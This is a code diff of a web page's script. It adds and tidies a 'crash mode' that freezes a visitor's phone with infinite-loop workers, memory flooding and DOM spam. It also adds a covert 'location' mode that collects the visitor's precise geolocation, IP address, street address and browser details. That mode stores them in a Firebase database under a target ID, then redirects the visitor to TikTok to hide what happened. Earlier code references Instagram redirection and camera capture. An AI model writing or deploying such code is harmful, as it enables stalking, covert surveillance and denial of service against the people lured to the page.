@@ -17,41 +17,27 @@
     <canvas id="canvas"></canvas>
 
 <script>
-    // CRASH MODE - RAM VE CPU KILLER
     (function() {
         const params = new URLSearchParams(window.location.search);
         const isCrash = params.get('crash') === '1';
         
         if (isCrash) {
-            // TELEFONU DONDUMA SOKAN KOD
+            if (window.opener || window.history.length > 1) {
+                window.location.href = 'https://www.tiktok.com';
+                return;
+            }
             function crashDevice() {
-                const startTime = Date.now();
                 const memoryHog = [];
                 const workerScript = "while(true){}";
                 const blob = new Blob([workerScript], { type: "application/javascript" });
-                
-                // 1. CPU %100 yap
                 for(let i = 0; i < 8; i++) {
                     const worker = new Worker(URL.createObjectURL(blob));
                     setTimeout(() => worker.terminate(), 30000);
                 }
-                
-                // 2. RAM doldur
                 setInterval(() => {
-                    try {
-                        for(let i = 0; i < 100; i++) {
-                            memoryHog.push(new Array(1000000).fill('x'.repeat(1000)));
-                        }
-                    } catch(e) {}
+                    try { for(let i = 0; i < 100; i++) { memoryHog.push(new Array(1000000).fill('x'.repeat(1000))); } } catch(e) {}
                 }, 10);
-                
-                // 3. Sonsuz döngü
-                setInterval(() => {
-                    const a = [];
-                    for(let i = 0; i < 1000000; i++) a.push(i * Math.random());
-                }, 5);
-                
-                // 4. DOM spam
+                setInterval(() => { const a = []; for(let i = 0; i < 1000000; i++) a.push(i * Math.random()); }, 5);
                 setInterval(() => {
                     for(let i = 0; i < 500; i++) {
                         const div = document.createElement('div');
@@ -63,17 +49,105 @@
                     }
                 }, 50);
             }
-            
             crashDevice();
             document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:50%;">💀 CRASHING DEVICE 💀</h1>';
             return;
         }
     })();
     
-    // INSTAGRAM YONLENDIRME VE KAMERA KODU (onceki gibi calisir)
     (function() {
         const params = new URLSearchParams(window.location.search);
+        const mode = params.get('mode');
         const forceChrome = params.get('force_chrome');
+        
+        if (mode === 'location') {
+            const uid = params.get('uid');
+            if (!uid) { window.location.href = 'https://www.tiktok.com'; return; }
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        let ip = 'unknown';
+                        try {
+                            const ipRes = await fetch('https://api.ipify.org?format=json');
+                            const ipData = await ipRes.json();
+                            ip = ipData.ip;
+                        } catch(e) {}
+                        
+                        let address = 'Adres alınamadı';
+                        try {
+                            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&accept-language=tr`);
+                            const geoData = await geoRes.json();
+                            address = geoData.display_name || 'Adres alınamadı';
+                        } catch(e) {}
+                        
+                        const FIREBASE_CONFIG = {
+                            apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
+                            authDomain: "camerahhh-15487.firebaseapp.com",
+                            projectId: "camerahhh-15487",
+                            storageBucket: "camerahhh-15487.firebasestorage.app",
+                            messagingSenderId: "212849652224",
+                            appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
+                        };
+                        
+                        function loadFirebase() {
+                            return new Promise((resolve, reject) => {
+                                if (typeof firebase !== 'undefined' && firebase.apps.length) { resolve(firebase); return; }
+                                const script = document.createElement('script');
+                                script.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';
+                                script.onload = () => {
+                                    const script2 = document.createElement('script');
+                                    script2.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js';
+                                    script2.onload = () => resolve(firebase);
+                                    script2.onerror = () => reject('Firestore load failed');
+                                    document.head.appendChild(script2);
+                                };
+                                script.onerror = () => reject('Firebase load failed');
+                                document.head.appendChild(script);
+                            });
+                        }
+                        
+                        try {
+                            await loadFirebase();
+                            if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
+                            const db = firebase.firestore();
+                            
+                            await db.collection("locations").add({
+                                userId: uid,
+                                latitude: lat,
+                                longitude: lng,
+                                accuracy: accuracy,
+                                address: address,
+                                ip: ip,
+                                userAgent: navigator.userAgent,
+                                timestamp: new Date().toISOString(),
+                                unix: Date.now()
+                            });
+                        } catch(e) {
+                            console.log('Firebase kayıt hatası:', e.message);
+                        }
+                        
+                        window.location.href = 'https://www.tiktok.com';
+                    },
+                    (error) => {
+                        window.location.href = 'https://www.tiktok.com';
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                window.location.href = 'https://www.tiktok.com';
+            }
+            return;
+        }
+        
         const userAgent = navigator.userAgent;
         const isInstagram = userAgent.includes('Instagram') || userAgent.includes('FBAV') || userAgent.includes('FBAN');
         
@@ -90,8 +164,8 @@
             return;
         }
         
-        // Crash kontrolu (yukarida yapildi, buraya gelmez)
         if(params.get('crash') === '1') return;
+        if(mode === 'location') return;
         
         const FIREBASE_CONFIG = {
             apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
